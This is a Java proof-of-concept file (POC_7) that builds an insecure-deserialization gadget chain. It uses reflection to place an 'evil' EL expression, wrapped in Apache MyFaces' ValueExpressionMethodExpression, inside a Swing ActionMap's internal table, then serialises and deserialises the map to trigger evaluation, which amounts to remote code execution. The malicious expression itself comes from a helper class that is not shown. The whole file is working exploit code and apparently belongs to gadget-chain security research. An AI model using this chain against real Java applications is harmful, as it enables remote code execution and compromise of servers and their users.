package com.example.Myface;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;

import javax.el.ValueExpression;
import javax.swing.*;
import javax.swing.text.DefaultEditorKit;

public class POC_7 {

    /***
     * run wtih actionMap_equals.jar
     */

    public static void main(String[] args) throws Exception {
        ValueExpression evil = Share.getEvilExpression();
        ValueExpressionMethodExpression expression = new ValueExpressionMethodExpression(evil);

        ActionMap map = new ActionMap();
        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();

        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{expression, action, expression, action};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(map, "arrayTable", arrayTable);

        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
